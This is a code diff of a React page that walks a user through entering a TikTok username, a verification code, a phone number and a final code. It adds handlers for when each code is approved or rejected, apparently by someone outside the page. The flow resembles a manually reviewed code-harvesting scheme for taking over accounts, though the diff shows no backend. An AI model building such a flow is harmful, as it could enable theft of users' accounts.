@@ -31,7 +31,6 @@ export default function StartPage() {
           const res = await fetch(`/api/submissions?id=${parsedUser.id}`);
           if (!res.ok) {
             if (res.status === 404) {
-              // No submission found, start from step 1 with username pre-filled
               setSubmissionData({ tiktokUsername: parsedUser.id, id: parsedUser.id });
               setCurrentStep(1); 
             } else {
@@ -40,8 +39,11 @@ export default function StartPage() {
           } else {
             const submission: Submission = await res.json();
             setSubmissionData(submission);
-            // Determine which step to show based on submission status
             if (submission.isVerified) {
+              router.replace('/success');
+              return;
+            }
+            if (submission.finalCodeStatus === 'approved') {
               router.replace('/success');
               return;
             }
@@ -52,14 +54,13 @@ export default function StartPage() {
           }
         } catch (error) {
           toast({ variant: 'destructive', title: 'Error', description: 'Could not retrieve your submission status.' });
-          setCurrentStep(1); // Default to step 1 on error
+          setCurrentStep(1);
         } finally {
           setIsCheckingStatus(false);
         }
       };
       fetchSubmissionStatus();
     } else {
-      // No user in session, start from the beginning
       setCurrentStep(1);
       setIsCheckingStatus(false);
     }
@@ -69,7 +70,6 @@ export default function StartPage() {
     const updatedData = { ...submissionData, ...data };
     setSubmissionData(updatedData);
 
-    // If this is the first step, create the user session
     if (!user && data.tiktokUsername) {
         const username = data.tiktokUsername.startsWith('@') ? data.tiktokUsername.substring(1) : data.tiktokUsername;
         const newUser: AuthUser = { id: username };
@@ -84,16 +84,53 @@ export default function StartPage() {
     setCurrentStep(prev => prev - 1);
   };
 
+  const handleRejection = (step: 'verificationCode' | 'phoneNumber' | 'finalCode') => {
+    toast({
+      variant: 'destructive',
+      title: 'Submission Rejected',
+      description: `Your ${step.replace('Code', ' code')} was rejected. Please check it and try again.`,
+    });
+    // This will cause the step component to re-render, allowing the user to try again.
+    setSubmissionData(prev => ({...prev}));
+  };
+
+  const handleApproval = (data: Partial<Submission>) => {
+    setSubmissionData(prev => ({...prev, ...data}));
+    setCurrentStep(prev => prev + 1);
+  };
+
   const renderStep = () => {
     switch (currentStep) {
       case 1:
         return <TiktokUsernameStep onNext={handleNextStep} initialData={submissionData} />;
       case 2:
-        return <VerifyCodeStep onNext={handleNextStep} onBack={handlePrevStep} submissionId={submissionData.id!} />;
+        return (
+          <VerifyCodeStep
+            submissionId={submissionData.id!}
+            onApproval={(data) => handleApproval(data)}
+            onRejection={() => handleRejection('verificationCode')}
+            onBack={handlePrevStep}
+            key={`verify-step-${submissionData.id}`}
+          />
+        );
       case 3:
-        return <SelectNumberStep onNext={handleNextStep} onBack={handlePrevStep} submissionId={submissionData.id!} />;
+        return (
+            <SelectNumberStep
+                submissionId={submissionData.id!}
+                onNext={handleNextStep}
+                onBack={handlePrevStep}
+            />
+        );
       case 4:
-        return <FinalCodeStep onNext={handleNextStep} onBack={handlePrevStep} submissionId={submissionData.id!} />;
+        return (
+          <FinalCodeStep
+            submissionId={submissionData.id!}
+            onApproval={() => router.push('/success')}
+            onRejection={() => handleRejection('finalCode')}
+            onBack={handlePrevStep}
+            key={`final-step-${submissionData.id}`}
+          />
+        );
       default:
         return (
             <div className="flex flex-col items-center justify-center text-center">
